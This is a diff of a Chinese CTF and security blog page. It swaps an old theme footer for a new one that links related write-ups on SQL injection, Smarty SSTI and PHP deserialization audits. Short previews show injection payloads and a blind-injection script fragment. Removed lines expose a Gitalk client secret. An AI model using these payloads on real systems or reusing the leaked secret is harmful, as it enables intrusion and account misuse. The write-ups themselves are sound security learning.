-        <a href="/487280636@qq.com" title="E-Mail → 487280636@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="http://wpa.qq.com/msgrd?v=3&uin=487280636&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;487280636&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>QQ</a>
-      </span>
-  </div>
-  <div class="cc-license motion-element" itemprop="license">
-    <a href="https://creativecommons.org/publicdomain/zero/1.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-zero.svg" alt="Creative Commons"></a>
-  </div>
-
-
-
-      </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2026</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">信安小蚂蚁</span>
-</div>
-
-
-
-
-
-
-
-
-
-        
-<div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-</div>
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
-
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
-  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/muse.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
-
-  
-
-
-
-
-  
-<script src="/js/local-search.js"></script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1.8.0/dist/gitalk.min.css">
-
-<script>
-NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
-  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1.8.0/dist/gitalk.min.js', () => {
-    var gitalk = new Gitalk({
-      clientID    : 'Ov23li6cOHoOwCcszzi9',
-      clientSecret: '8f2a2156cf47355ba518edf71e62d5e1618dc229',
-      repo        : 'mayi077.github.io',
-      owner       : 'mayi077',
-      admin       : ['mayi077'],
-      id          : '0d9b1d0fe8ef85e593c43f0ab6c63aa2',
-        language: 'zh-CN',
-      distractionFreeMode: true,
-      enablePKCE: true
-    });
-    gitalk.render('gitalk-container');
-  }, window.Gitalk);
-});
-</script>
-
-</body>
-</html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://mayi077.github.io">信安小蚂蚁</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://mayi077.github.io/2020/05/06/NPUCTF2020-ReadlezPHP/">https://mayi077.github.io/2020/05/06/NPUCTF2020-ReadlezPHP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://mayi077.github.io" target="_blank">信安小蚂蚁</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/buuctf/">buuctf</a><a class="post-meta__tags" href="/tags/%E5%BA%8F%E5%88%97%E5%8C%96/">序列化</a></div><div class="post-share"><div class="social-share" data-image="/images/1.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2020/05/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%8E%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%88%B0getshell/" title="代码审计--从变量覆盖到getshell"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">代码审计--从变量覆盖到getshell</div></div><div class="info-2"><div class="info-item-1">漏洞源码123456789101112131415161718192021222324&lt;?class Carrot &#123;  const EXTERNAL_DIRECTORY = &#x27;D:\phpstudy\WWW\abc_&#x27;;  private $id;  private $lost = 0;  private $bought = 0;  public function __construct($input) &#123;    $this-&gt;id = rand(1, 1000);    foreach ($input as $field =&gt; $count) &#123;      $this-&gt;$field = $count++;    &#125;  &#125;  public function __destruct() &#123;    file_put_contents(      self::EXTERNAL_DIRECTORY . $this-&gt;id,      var_export(get_object_...</div></div></div></a><a class="pagination-related" href="/2020/05/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%89%B9%E5%AE%9A%E5%9C%BA%E5%90%88%E4%B8%8Baddslashes%E5%87%BD%E6%95%B0%E7%9A%84%E7%BB%95%E8%BF%87/" title="代码审计--特定场合下addslashes函数的绕过"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">代码审计--特定场合下addslashes函数的绕过</div></div><div class="info-2"><div class="info-item-1">漏洞源码123456789101112131415161718192021222324252627282930313233343536class LoginManager &#123;  private $em;  private $user;  private $password;  public function __construct($user, $password) &#123;    $this-&gt;em = DoctrineManager::getEntityManager();    $this-&gt;user = $user;    $this-&gt;password = $password;  &#125;  public function isValid() &#123;    $user = $this-&gt;sanitizeInput($this-&gt;user);    $pass = $this-&gt;sanitizeInput($this-&gt;password);    $queryBuilder = $this-&gt;em-&...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2020/02/28/GXYCTF2019-BabySQli/" title="[GXYCTF2019]BabySQli"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-02-28</div><div class="info-item-2">[GXYCTF2019]BabySQli</div></div><div class="info-2"><div class="info-item-1">前言：&emsp;蛮久没刷题了，颓废了一段日子，现在开始冲冲冲呀！ 一个新知识点&emsp;当查询的数据不存在的时候，联合查询就会构造一个虚拟的数据。&emsp;例如，数据表里有3个字段，我使用select * from _sql where id =111没有返回任何数据(表里最大id为10)。那么我们尝试使用union select 联合查询返回数据。使用select * from _sql where id =111 union select 1,2,3;(前题是已经知道表里有几个字段)    &emsp;这样我们就可以自定义它的字段了。 开始解题 打开题目尝试万能密码无果。查看源代码，发现一个base32，解码后发现是base64 再解码 得到select * from user where username = &#39;$name&#39; 解码网址   利用前面的知识点使用union select 来构造。我们先来判断有几个字段使用name=1&#39;union select 1,2# 报语法错误。name=1&#39;union select 1,2,3# 报用...</div></div></div></a><a class="pagination-related" href="/2020/02/03/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-02-03</div><div class="info-item-2">[CISCN2019 华北赛区 Day1 Web1]Dropbox</div></div><div class="info-2"><div class="info-item-1">前言：&emsp; 这题对于我这个菜鸡来说还是非常有挑战性的，看来很久wp才看懂并不是不理解phar只是代码审计我有点难受呀，还有那个才flag在哪个文件夹也有点玄乎，很些地方都是经验所得，那么我应该要多点经验了，多刷题多理解题！！加油哟！ 0X01 总体思路走一遍&emsp;&emsp;先把总体思路走一遍，有助于下面的理解。  打开题目链接是一个登入页面，下面有一个注册尝试去注册一个admin用户，成功。 注册然后登入成功后有一个上传文件的，我们试着去上传一个jpg文件，上传成功出现了一个下载和一个删除，这时猜想 下载 有任意下载文件漏洞。 按照惯例和经验，我们上传的文件是放在网站主目录/sandbox/hash目录下的，所以要想下载源码php文件必须跳转到上级目录。如想下载index.php源码许这样填写：filename=../../index.php 接着我们又下载了downloa.php和delete.php的源码通过代码审计发现还有个class.php文件，我们将其一并下载并保存在同一个文件夹内，接着放进seay自动审计。 接着对这些代码进行代码审计，主要还是clas...</div></div></div></a><a class="pagination-related" href="/2020/01/18/web-admin/" title="web-admin"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-01-18</div><div class="info-item-2">web-admin</div></div><div class="info-2"><div class="info-item-1">前言：&emsp;看别人的wp发现这题主要有3种方法但因现在的我能力有限只能搞懂一种方法——Unicode欺骗。那么接下来我将总结此种方法，以及解题思路。   一、解题思路 打开题目链接，发现可以注册可以登入。经过一系列判断过后，我开始尝试随便创一个用户。登入后发现，可以改密码和提交意见，随后在查看改密码的那个页面的源码有一个注释如：&emsp;下载后观察发现：     打开代码后发现古怪，自定义函数： 1234def strlower(username):    username = nodeprep.prepare(username)    return username    // 看字面意思是将字符串中的大写转小写，但是python自带了lower函数所以古怪，经过查找资料发现Unicode欺骗漏洞   然后我们发现在使用nodeprep.prepare函数转换时过程如下： 1ᴬ-&gt; A -&gt; a  而从上面的代码可知，在创建的时候会进行一次nodeprep.prepare(username)赋值username，在改密码时又会进行一次nodeprep.pre...</div></div></div></a><a class="pagination-related" href="/2020/03/28/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B-CHECKIN/" title="[V&amp;N2020 公开赛]CHECKIN"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-28</div><div class="info-item-2">[V&amp;N2020 公开赛]CHECKIN</div></div><div class="info-2"><div class="info-item-1">前言:&emsp;2天前做的了，记得当时做了一天反弹shell都不成功，第二天起来又开始测试突然想到buuctf是不能访问外网的自然不能反弹到我阿里云服务器上了。难受呀，不过还是有几个知识点值得记录的。 /proc/pid/fd&emsp;这里包含了进程打开文件的文件描述符，这些描述符是指向实际文件的符号链接。可以通过它恢复删除的文件。可以参考：【Linux恢复误删除的文件或者目录】&emsp;这么理解吧，删除了一个文件但是它打开过且还保存在内存当中，我们可以通过/proc/[pid]/fd这个目录来恢复它。  解题： 按照提示，新建一个隐私窗口并且开启一个 Linux Labs 。按照给定信息我们来连接它。这里我们使用ssh -l root node3.buuoj.cn -p26749 来连接。  打开题目就有源码，分析一下： 12345678910111213141516171819202122232425262728from flask import Flask, requestimport osapp = Flask(__name__)flag_file = open(&...</div></div></div></a><a class="pagination-related" href="/2020/04/27/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11-Smarty-SSTI/" title="[CISCN2019 华东南赛区]Web11 -- Smarty SSTI"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-04-27</div><div class="info-item-2">[CISCN2019 华东南赛区]Web11 -- Smarty SSTI</div></div><div class="info-2"><div class="info-item-1">前言&emsp;这题主要考的是ssti注入，与以前不同的是这是我第一次遇到Smarty的ssti注入题。 确定漏洞 打开题目后发现右上方有个Current IP:127.0.0.1很明显这是我用xxf伪造的ip。猜测ssti。 抓包，按照下图的判断可以知道是 Smarty 框架。 然后一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。该题目的Smarty版本是3.1.30    常用利用方式{php} 标签Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但就该题目而言无效，因为3.1.30已废除这个{php}标签。 {literal} 标签&emsp;{literal}可以让块中间的内容忽略Smarty的解析。我们可以使用 1&#123;literal&#125;&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt;&#123;/literal&#125; 但是php7已经不支持&lt;script langua...</div></div></div></a><a class="pagination-related" href="/2020/01/26/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-01-26</div><div class="info-item-2">[CISCN2019 华北赛区 Day2 Web1]Hack World</div></div><div class="info-2"><div class="info-item-1">前言：&emsp; 现在看来题目确实不算太难，可是确实也花了我不少时间呀，可能还是自己的经验和基础不够吧，加油吧骚年！ 0X01 解题思路 进行简单测试，不是报错注入，直接进行盲注测试。经过判断发现后台语句可以判断(1=1) 使用脚本如下：1234567891011121314151617181920212223import requestsimport stringimport time    ##导入time模块是需要用导time.sleep()，因为有时会检测大量连续请求url = &#x27;http://7239d6e1-3b79-4c86-86f2-84690ba902ce.node3.buuoj.cn/index.php&#x27;x=string.printable    ##可打印的字符print(x)result = &quot;&quot;for a in range(60):    for b in x :        payload= &quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">信安小蚂蚁</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">135</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">86</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mayi077"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">2020–2021，这里记录了 100+ 篇文字。
+后来因工作入职，暂时搁笔。
+2026，重新起航。
+继续写下去。
+</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%8A%A0%E5%9B%BA"><span class="toc-number">1.</span> <span class="toc-text">知识加固</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#construct"><span class="toc-number">1.1.</span> <span class="toc-text">__construct()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#eval%E5%92%8Cassert"><span class="toc-number">1.2.</span> <span class="toc-text">eval和assert</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#eval%E5%AE%9A%E4%B9%89%E5%92%8C%E7%94%A8%E6%B3%95"><span class="toc-number">1.2.1.</span> <span class="toc-text">eval定义和用法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#assert%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.2.</span> <span class="toc-text">assert函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">解题思路</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/20/2026-04-20-TLS%E5%8A%A0%E5%AF%86%E5%A5%97%E4%BB%B6/" title="TLS加密套件">TLS加密套件</a><time datetime="2026-04-20T14:30:00.000Z" title="发表于 2026-04-20 22:30:00">2026-04-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/20/2026-04-20-AI-Agent-%E6%9E%B6%E6%9E%84/" title="AI Agent 架构">AI Agent 架构</a><time datetime="2026-04-19T16:00:00.000Z" title="发表于 2026-04-20 00:00:00">2026-04-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/04/15/PHP-%E6%AD%A3%E5%88%99%E7%9A%84-m%E5%A4%9A%E8%A1%8C%E6%A8%A1%E5%BC%8F/" title="PHP 正则的 m多行模式">PHP 正则的 m多行模式</a><time datetime="2021-04-15T00:54:31.000Z" title="发表于 2021-04-15 08:54:31">2021-04-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/04/14/vulnstack-ATT-CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/" title="vulnstack-ATT&amp;CK实战系列 红队实战（一）">vulnstack-ATT&amp;CK实战系列 红队实战（一）</a><time datetime="2021-04-14T12:46:10.000Z" title="发表于 2021-04-14 20:46:10">2021-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/04/09/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="域内横向移动">域内横向移动</a><time datetime="2021-04-09T07:56:53.000Z" title="发表于 2021-04-09 15:56:53">2021-04-09</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 信安小蚂蚁</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 5.4.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.5-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5-b1"></script><script src="/js/main.js?v=5.5.5-b1"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
